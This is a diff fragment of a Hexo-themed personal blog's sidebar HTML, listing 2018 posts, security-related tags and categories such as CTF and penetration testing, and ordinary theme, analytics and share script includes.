+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span>
+            <a class="archive-post-title" href="/2018/06/01/git/">git learn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span>
+            <a class="archive-post-title" href="/2018/05/30/markdown%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/">Markdown语法总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span>
+            <a class="archive-post-title" href="/2018/05/29/yuanmaxielou/">Web源码泄露总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span>
+            <a class="archive-post-title" href="/2018/05/28/python/">学习python中遇到的问题及总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2018/05/18/rsa/">Crypto_RSA算法总结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span>
+            <a class="archive-post-title" href="/2018/05/16/problem/">日常学习中问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span>
+            <a class="archive-post-title" href="/2018/05/09/Pythonlearn/">Pythonlearn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span>
+            <a class="archive-post-title" href="/2018/03/24/2018-QWB/">2018 QWB 题目整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span>
+            <a class="archive-post-title" href="/2018/02/14/blog/">搭博客的经历</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="CTF">
+                <span class="iconfont-archer">&#xe606;</span>
+                CTF
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="企业安全">
+                <span class="iconfont-archer">&#xe606;</span>
+                企业安全
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="learn">
+                <span class="iconfont-archer">&#xe606;</span>
+                learn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="漏洞">
+                <span class="iconfont-archer">&#xe606;</span>
+                漏洞
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="安全评估">
+                <span class="iconfont-archer">&#xe606;</span>
+                安全评估
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="渗透测试">
+                <span class="iconfont-archer">&#xe606;</span>
+                渗透测试
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="安全开发">
+                <span class="iconfont-archer">&#xe606;</span>
+                安全开发
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="代码审计">
+                <span class="iconfont-archer">&#xe606;</span>
+                代码审计
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="problem">
+                <span class="iconfont-archer">&#xe606;</span>
+                problem
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Crypto">
+                <span class="iconfont-archer">&#xe606;</span>
+                Crypto
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="应急响应">
+                <span class="iconfont-archer">&#xe606;</span>
+                应急响应
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="blog">
+            <span class="iconfont-archer">&#xe60a;</span>
+            blog
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞总结">
+            <span class="iconfont-archer">&#xe60a;</span>
+            漏洞总结
+        </span>
+    
+        <span class="sidebar-category-name" data-categories="learn">
+            <span class="iconfont-archer">&#xe60a;</span>
+            learn
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "https://yinwc.github.io",
+        root: siteMetaRoot,
+        author: "Y1ZkRA"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
